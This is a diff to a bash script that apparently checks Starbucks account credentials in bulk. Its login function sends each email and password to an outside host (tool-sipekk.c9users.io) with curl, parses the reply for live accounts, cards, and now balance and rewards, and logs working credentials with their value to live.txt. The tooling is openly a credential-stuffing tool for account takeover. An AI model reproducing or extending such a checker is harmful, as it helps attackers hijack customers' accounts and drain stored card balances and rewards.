@@ -16,9 +16,12 @@ login(){
 	ngecurl=$(curl -s "https://tool-sipekk.c9users.io/starbuck/api.php?mail=${mail}&pass=${pass}")
 	total=$(echo "$ngecurl" | grep -Po '(?<=SbuxCard\(<font color=lime>)[^ Cards]*')
 	cardlist=$(echo "$ngecurl" | grep -Po '(?<=\[<font color=lime>)[^\]]*' | sed 's:<[^>]*>::g')
+	balance=$(echo "$ngecurl" | grep -Po '(?<=Ballance = <font color=green>)[^</]*')
+	progress=$(echo "$ngecurl" | grep -Po '(?<=Progress : )[^ Reward]*')
+	reward=$(echo "$ngecurl" | grep -Po '(?<=Reward : <font color=red>)[^</]*')
 	if [[ $ngecurl =~ "Live" ]]; then
-		echo -e "[${GREEN}LIVE${NC}]-[${GREEN}$mail${NC}]-[${GREEN}$total Cards${NC}]-[${GREEN}$cardlist${NC}]"
-		echo "Live | $mail | $pass | $total Cards | $cardlist" >> live.txt
+		echo -e "[${GREEN}LIVE${NC}]-[${GREEN}$mail${NC}]-[${GREEN}$total Cards${NC}]-[${GREEN}$cardlist${NC}]-[${GREEN}$balance Balance${NC}]-[${GREEN}$progress Progress${NC}]-[${GREEN}$reward Rewards${NC}]"
+		echo "Live | $mail | $pass | $total Cards | $cardlist | $balance Balance | $progress Progress | $reward Rewards" >> live.txt
 	else
 		echo -e "[${RED}DIE${NC}]"
 	fi
